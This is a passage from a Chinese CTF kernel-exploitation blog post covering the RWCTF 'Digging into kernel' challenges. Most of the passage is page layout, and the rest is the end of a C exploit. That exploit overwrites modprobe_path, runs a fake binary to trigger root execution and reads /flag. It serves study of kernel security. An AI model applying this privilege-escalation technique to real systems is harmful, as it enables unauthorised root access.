class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>kernel学习笔记2</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/63384/">https://ixout.github.io/posts/63384/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-01-08</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-02-05</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel/">kernel</a><a class="post-meta__tags" href="/tags/heap/">heap</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/53436/" title="windows pwn"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1536aeca2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">windows pwn</div></div></a></div><div class="next-post pull-right"><a href="/posts/1523/" title="WASM初识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/back.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WASM初识</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="iconfont icon-github1"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">39</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">46</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">3</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF2023-%E4%BD%93%E9%AA%8C%E8%B5%9B-Digging-into-kernel-3"><span class="toc-number">1.</span> <span class="toc-text">RWCTF2023 体验赛 - Digging into kernel 3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951"><span class="toc-number">1.2.</span> <span class="toc-text">解法1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">kernel密钥管理接口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952"><span class="toc-number">1.3.</span> <span class="toc-text">解法2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%953"><span class="toc-number">1.4.</span> <span class="toc-text">解法3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF2022-%E9%AB%98%E6%A0%A1%E8%B5%9B-Digging-into-kernel-1-amp-2"><span class="toc-number">2.</span> <span class="toc-text">RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="toc-number">2.2.1.</span> <span class="toc-text">任意地址读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="toc-number">2.2.2.</span> <span class="toc-text">泄露基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9modprobe-path%E4%BB%A5root%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">修改modprobe_path以root执行程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/13785/" title="kernel学习笔记1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2c09c340e57a4963ba60fdc0.jpg" alt="kernel学习笔记1"></a><div class="content"><a class="title" href="/posts/13785/" title="kernel学习笔记1">kernel学习笔记1</a><time datetime="2023-12-28" title="发表于 2023-12-28">2023-12-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/49295/" title="how2heap"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" alt="how2heap"></a><div class="content"><a class="title" href="/posts/49295/" title="how2heap">how2heap</a><time datetime="2023-08-19" title="发表于 2023-08-19">2023-08-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>